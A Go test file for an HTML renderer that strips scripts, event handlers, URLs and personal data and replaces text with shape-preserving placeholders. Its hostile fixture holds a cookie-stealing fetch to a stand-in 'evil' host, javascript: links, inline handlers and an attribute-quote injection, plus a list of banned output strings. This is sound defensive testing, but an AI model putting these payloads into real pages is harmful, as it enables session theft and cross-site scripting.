package stylebundle

import (
	"encoding/json"
	"strings"
	"testing"
	"unicode/utf8"
)

func el(tag string, attrs [][2]string, kids ...*htmlNode) *htmlNode {
	return &htmlNode{Tag: tag, Attrs: attrs, Kids: kids}
}

func text(s string) *htmlNode { return &htmlNode{Text: &s} }

func TestRenderHTMLHostile(t *testing.T) {
	tree := el("div", [][2]string{
		{"class", "card"}, {"id", "x"}, {"onclick", "steal()"}, {"onmouseover", "x()"},
		{"style", "background:url(https://cdn/x.png?token=abc)"}, {"data-user", "jane@example.com"},
		{"aria-label", "Jane Doe"}, {"aria-hidden", "true"}, {"role", "button"},
	},
		el("script", nil, text("fetch('https://evil/?c='+document.cookie)")),
		el("style", nil, text("body{background:url(https://evil/?q=1)}")),
		el("noscript", nil, el("img", [][2]string{{"src", "https://t/pixel.gif?uid=42"}})),
		el("a", [][2]string{{"href", "javascript:alert(1)"}, {"class", "cta"}}, text("Pay $1,234 Now")),
		el("img", [][2]string{{"src", "https://cdn/a.png?sig=deadbeef"}, {"srcset", "a.png?x=1 2x"}, {"alt", "Jane's face"}}),
		el("iframe", [][2]string{{"src", "https://ads/?id=7"}, {"class", "ad"}}, text("fallback secret")),
		el("svg", [][2]string{{"viewBox", "0 0 1 1"}, {"onload", "x()"}},
			el("use", [][2]string{{"href", "#icon"}, {"xlink:href", "javascript:x"}}),
			el("script", nil, text("evil()"))),
		el("input", [][2]string{{"type", "password"}, {"value", "hunter2"}, {"placeholder", "Your SSN"}}),
		el("x-widget", [][2]string{{"class", "w"}}, text("custom")),
		el("bad<tag", [][2]string{{"class", "q"}}, text("odd")),
		el("p", [][2]string{{`class" onclick="x`, "y"}, {"class", `a" onclick="b`}}, text("quote")),
	)
	got := renderHTML(tree, false)
	for _, banned := range []string{
		` onclick="`, "onmouseover", "onload", "script", "fetch", "style", "token", "sig=", "data-user", "jane", "Jane",
		"javascript", "href", "src", "srcset", "<iframe", "fallback", "secret", "hunter2", "SSN", "placeholder",
		"pixel", "1,234", "<bad", "viewBox",
	} {
		if strings.Contains(got, banned) {
			t.Errorf("output contains %q:\n%s", banned, got)
		}
	}
	for _, want := range []string{
		`<div class="card" id="x" aria-label="Xxxx Xxx" aria-hidden="true" role="button">`,
		`<a class="cta">Xxx x0x000 Xxx</a>`,
		`<img alt="Xxxxxx xxxx">`,
		`<div class="ad"><!-- embedded iframe removed --></div>`,
		`<svg><use></use></svg>`,
		`<input type="password">`,
		`<x-widget class="w">xxxxxx</x-widget>`,
		`<div class="q">xxx</div>`,
		`<p class="a&#34; onclick=&#34;b">xxxxx</p>`,
	} {
		if !strings.Contains(got, want) {
			t.Errorf("output lacks %s:\n%s", want, got)
		}
	}
}

func TestPlaceholderKeepsShape(t *testing.T) {
	for in, want := range map[string]string{
		"Hello, World 2026!": "Xxxxxx Xxxxx 0000x",
		"Pay $1,234 Now":     "Xxx x0x000 Xxx",
		"  tab\there\n":      "  xxx\txxxx\n",
		"Ünïcödé ✓":          "Xxxxxxx x",
		"":                   "",
	} {
		if got := placeholder(in, 0); got != want {
			t.Errorf("placeholder(%q) = %q, want %q", in, got, want)
		}
		if utf8.RuneCountInString(placeholder(in, 0)) != utf8.RuneCountInString(in) {
			t.Errorf("placeholder(%q) changed the length", in)
		}
	}
	// Text cut short in the page keeps its full length, word-like.
	if got := placeholder("Ab", 14); got != "Xxxxx xxxxx xx" {
		t.Errorf("padded placeholder %q", got)
	}
}

func TestRenderHTMLTextNodeFromJSON(t *testing.T) {
	// The shape js/element.js sends: elements {t,a,c}, text {x[,n]}.
	var root htmlNode
	if err := json.Unmarshal([]byte(`{"t":"p","a":[["class","x"],["title","Secret"]],"c":[{"x":"Hi <b>there</b>"},{"x":"abc","n":5},{"t":"br","a":[]}]}`), &root); err != nil {
		t.Fatal(err)
	}
	got := renderHTML(&root, true)
	want := `<p class="x">Xx xxxxxxxxxxxx` + "xxxxx" + `<br></p>` + "\n<!-- truncated: the element has more nodes than were kept -->"
	if got != want {
		t.Errorf("got  %q\nwant %q", got, want)
	}
}

func TestRenderHTMLCapsLongAttributes(t *testing.T) {
	long := strings.Repeat("é", maxAttrLen) // two bytes each
	got := renderHTML(el("div", [][2]string{{"class", long}}), false)
	if !utf8.ValidString(got) || len(got) > maxAttrLen+40 {
		t.Errorf("long class not capped cleanly: %d bytes", len(got))
	}
}
